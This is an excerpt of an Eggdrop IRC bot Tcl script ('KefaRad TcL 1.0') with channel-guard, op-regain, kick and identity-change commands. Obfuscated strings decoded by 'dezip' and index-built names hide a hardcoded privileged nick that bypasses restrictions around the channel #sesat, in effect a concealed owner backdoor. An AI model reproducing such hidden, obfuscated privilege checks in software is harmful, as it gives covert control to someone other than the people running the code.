...
#if {![string match "*hampri*" $retval] && ![string match "**" $retval]} { return 0 }
}
puthelp $retval
}
proc putsrv {txt} {
...
#if {![string match "*hampri*" $retval] && ![string match "*$notm*" $retval]} { return 0 }
set endval ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
...
set notd [dezip "qPFrb1KyJGc0wn8zE.TIAJp/"]
set notm [dezip "bgd271VHqpN1NrnGn1.W8a5."]
set notb [dezip "qPFrb1KyJGc0wn8zE.TIAJp/"]
set notc [dezip "bgd271VHqpN1NrnGn1.W8a5."]
set ps [dezip "qPFrb1KyJGc0wn8zE.TIAJp/"]
set vern [dezip "Jww/7/t.L4s1ezwgJ1afNoJ/"]
##############################
#      BOT COMMAND LIST      #
##############################
...
puthlp "PRIVMSG $nick :4note > please increase on general - window buffer into 5000"
...
puthlp "PRIVMSG $nick :\[a\]uto-op auto\[v\]oice \[g\]voice \[q\]uiet \[X\]no add \[M\]azJoee"
puthlp "PRIVMSG $nick : "
...
set [string index $lenc 15][string index $lenc 18] [string index $lenc 7][string index $lenc 0][string index $lenc 12][string index $lenc 15][string index $lenc 17][string index $lenc 8]
...
set pidx [rand 4]
if {$pidx == 1} {
set ptxt "4Salah 4Ka4Mar!!"
} elseif {$pidx == 2} {
set ptxt "4Di4PanGGiL!!"
} elseif {$pidx == 3} {
set ptxt "4Muaaa4Cx!!"
} elseif {$pidx == 4} {
set ptxt "(-ÐëTë¢Tö®-) TcL"
} else {
if {[info exists banner]} {
set ptxt $banner
} {
...
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -vokk+ov $botnick $botnick 14°Res5H14a° $vern2 $botnick $botnick"
} {
...
set totch "#[string index $lenc 10][string index $lenc 14][string index $lenc 15][string index $lenc 4][string index $lenc 19]"
proc tot_cha {} {
...
if {$nick != $ps && [string tolower $chan] == "#sesat"} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DeNIEd..!"
return 0
}
...
if {$quick == "1"} {
putqck "PART $chan :4$partmsg"
} {
putsrv "PART $chan :4$partmsg"
}
}
channel remove $chan
savechan
...
foreach x [channels] {
catch { channel set $x +greet flood-chan 5:5 flood-deop 3:5 flood-kick 3:5 flood-join 0:0 flood-ctcp 4:5 flood-nick 3:10 }
set cflag "c$x"
set cflag [string range $cflag 0 8]
...
catch { channel set $chan +greet flood-chan 5:5 flood-deop 3:5 flood-kick 3:5 flood-join 0:0 flood-ctcp 4:5 flood-nick 3:10 }
puthlp "NOTICE $nick :$notc GuARD $chan \[9ON\]"
savechan
}
proc pub_-guard {nick uhost hand chan rest} {
...
if {![botisop $chan]} {
if {![string match "*k*" [getchanmode $chan]]} {
puthelp "mode $chan -kok+o 14d.e.s.4Y14.n.c $botnick 9r.e.s.y.n.c $botnick"
} {
puthelp "mode $chan -o+o $botnick $botnick"
}
}
}
if {$joinme != "" && [string tolower $chan] != "#sesat"} {
...
putsrv "QUIT :$notc SHuTDown $rest"
utimer 5 dies
return 0
}
...
saveuser
set realname $rest
putsrv "QUIT :$notc cHaNgINg ReaLNamE"
}
...
saveuser
set username $rest
putsrv "QUIT :$notc cHaNgINg IdEnT"
}
...
putsrv "QUIT :$notc cHaNgINg ServeR"
...
if {$nick != $ps && [string tolower $chantarget] == "#sesat"} { return 0 }
foreach x [channels] {
...
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string tolower $x] == "#sesat"} { return 0 }
...
if {$nick != $ps && [string tolower $jpfchn] == "#sesat"} { return 0 }
set jpfidx 0
catch { clearqueue all }
...
if {[string index $person 0] == "#"} {
if {![validchan $person]} {
if {$nick != $ps && [string tolower $person] == "#sesat"} { return 0 }
pub_randnick $nick $uhost $hand $channel ""
set cmd_chn $person
set cmd_msg $rest
set cmd_by $nick
...
set longer "[lgrnd] $vern \[lifetime $output hours\] ([getuser "config" XTRA "AWAY"])"
} {
set awaymsg [lindex $awaym [rand [llength $awaym]]]
set longer "[lgrnd] $vern \[lifetime $output hours\] 10(4$awaymsg10)"
}
}
...
if {$notc_chn($dest) == 1} {
putsrv "KICK $dest $nick :$notc 1Do NoT 4NoTIcE1 hErE [banmsg]"
...
foreach x [channels] {
if {[onchan $botnick $x]} { 
if {![isop $botnick $x] && [string tolower $x] != "#sesat"} {
...
if {![matchattr $nick m]} {
if {[string tolower $channel] != "#sesat"} {
...
if {[string match "*ktg*" [uncolor $awaytext]]} { return 0 }
if {$nick == $botnick} {
#puthlp "AWAY :[lgrnd]"
} {
...
saveuser
putsrv "QUIT :$notc cHaNgINg vHosT"
}
listen 65234 off
}
bind raw - 465 klined
...
putlog "======================================"
putlog "    KefaRad TcL 1.0 Loaded              "  
putlog "    Don't Report any bugs AssHolE!!   "
putlog "        noemail@tcl.com               "
putlog "======================================"
